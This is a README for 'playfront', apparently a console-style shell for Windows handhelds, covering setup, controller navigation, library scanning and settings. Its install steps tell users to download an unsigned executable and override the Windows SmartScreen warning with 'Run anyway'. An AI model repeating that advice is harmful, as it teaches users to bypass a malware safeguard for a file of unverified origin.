# 🎮 playfront - Console interface for Windows handhelds

[![Download playfront](https://img.shields.io/badge/Download-Playfront-blueviolet)](https://github.com/Butyraceous-purana223/playfront)

playfront provides a focused, console-like shell for your Windows handheld device. It replaces the standard Windows desktop environment with a layout designed for navigation with joysticks and triggers. This interface gives you quick access to your game library and system settings without the need for a mouse or keyboard.

## ⚙️ System Requirements

Your device needs specific software and hardware to run this program smoothly. Check these requirements before you begin:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Modern AMD Ryzen or Intel Core processor.
*   Memory: At least 8 gigabytes of RAM.
*   Display: A handheld monitor with a resolution of 1280x720 or higher.
*   Disk Space: 200 megabytes of free storage for the application.
*   Graphics: Hardware with updated graphics drivers installed.

## 💾 Installation and Setup

Follow these steps to set up the software on your device.

1. Visit [the releases page](https://github.com/Butyraceous-purana223/playfront) to find the latest version of the application.
2. Select the file named `playfront-installer.exe` to start the download.
3. Open the file once the download finishes. Windows might show a warning box titled "Windows protected your PC." 
4. Select "More info" in that box, then select "Run anyway."
5. Follow the on-screen instructions in the installer.
6. Choose the folder where you want to keep the program files.
7. Click "Finish" to complete the setup process.

## 🕹️ Using the Interface

The interface relies on your handheld controller input. You do not need secondary devices once the program opens.

*   D-Pad or Left Stick: Move between different icons and settings.
*   A Button: Select an item or open a folder.
*   B Button: Go back to the previous screen.
*   X Button: Open the search menu.
*   Y Button: Refresh your library of games.
*   Start/Menu Button: Open the main settings panel.

## 📂 Managing Your Game Library

The program tracks your installed games automatically. If a game does not appear, follow these steps:

1. Press the Start button to open the settings panel.
2. Navigate to the "Library" tab using the D-Pad.
3. Select "Scan for new games."
4. The application searches your drive for common executable files.
5. Once the scan finishes, your new games populate the main menu.

## 🛠️ Modifying Settings

You can change how the software behaves through the settings panel. These options adjust the visual style and performance.

*   Startup Settings: Enable "Launch at login" to open the interface automatically when you turn on your device.
*   Themes: Pick between light and dark mode to suit your preference.
*   Scaling: Adjust the UI size if text appears too small on your screen.
*   Performance Mode: Lock the frame rate of the interface to save battery life.

## 🔍 Troubleshooting

Common issues often have simple solutions. Read these tips before you seek additional help.

If the interface fails to open, check that you have the latest graphics drivers from the manufacturer website. The software requires these drivers to draw the menus correctly.

If your controller inputs do not register, exit the program completely using the task manager and restart it. This resets the connection between the application and the controller driver.

If the application runs slowly, close other background programs. Windows handhelds have limited resources, and background tasks can take processing power away from your games.

## 🛡️ Privacy and Data

We designed this tool to function as a local shell. The application does not send your usage data or library information to outside servers. All configuration files live in the local application data folder on your machine. You control your information at all times.
